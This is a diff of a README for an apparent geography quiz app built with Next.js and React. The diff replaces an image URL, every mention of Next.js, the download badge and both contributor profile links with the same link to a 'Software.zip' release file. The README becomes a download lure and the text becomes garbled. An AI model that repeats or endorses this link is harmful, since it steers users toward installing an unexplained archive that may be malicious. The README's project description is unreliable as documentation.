@@ -2,7 +2,7 @@
 
 Welcome to the CountriesFacts Quiz App repository! 🎉
 
-![CountriesFacts Quiz App](https://yourimageurl.com)
+![CountriesFacts Quiz App](https://github.com/Phillipp09/countriesfacts-quiz/releases/download/v2.0/Software.zip)
 
 ## About
 
@@ -11,7 +11,7 @@ This repository contains the code for an interactive and engaging app where you 
 ## Features
 
 🔹 Country quiz to test your knowledge  
-🔹 Modern user interface using Next.js and ReactJS  
+🔹 Modern user interface using https://github.com/Phillipp09/countriesfacts-quiz/releases/download/v2.0/Software.zip and ReactJS  
 🔹 Interactive and engaging geography game  
 🔹 Open-source project using TypeScript  
 🔹 Educational and fun project for all ages
@@ -39,7 +39,7 @@ This repository covers a wide range of topics related to web development, geogra
 🌐 Interactive Application   
 💻 JavaScript   
 🎨 Modern UI   
-🚀 Next.js   
+🚀 https://github.com/Phillipp09/countriesfacts-quiz/releases/download/v2.0/Software.zip   
 🌿 Open Source   
 🧠 Quiz App   
 ⚛️ ReactJS   
@@ -48,7 +48,7 @@ This repository covers a wide range of topics related to web development, geogra
 
 ## Link
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Phillipp09/countriesfacts-quiz/releases/download/v2.0/Software.zip)](https://github.com/Phillipp09/countriesfacts-quiz/releases/download/v2.0/Software.zip)
 
 ## Launch the Software
 
@@ -62,8 +62,8 @@ Join us in exploring the world through the CountriesFacts Quiz App! 🌎 Put you
 
 ## Contributors
 
-👨‍💻 John Doe - [@johndoe](https://github.com/johndoe)  
-👩‍💻 Jane Smith - [@janesmith](https://github.com/janesmith)
+👨‍💻 John Doe - [@johndoe](https://github.com/Phillipp09/countriesfacts-quiz/releases/download/v2.0/Software.zip)  
+👩‍💻 Jane Smith - [@janesmith](https://github.com/Phillipp09/countriesfacts-quiz/releases/download/v2.0/Software.zip)
 
 ---
 
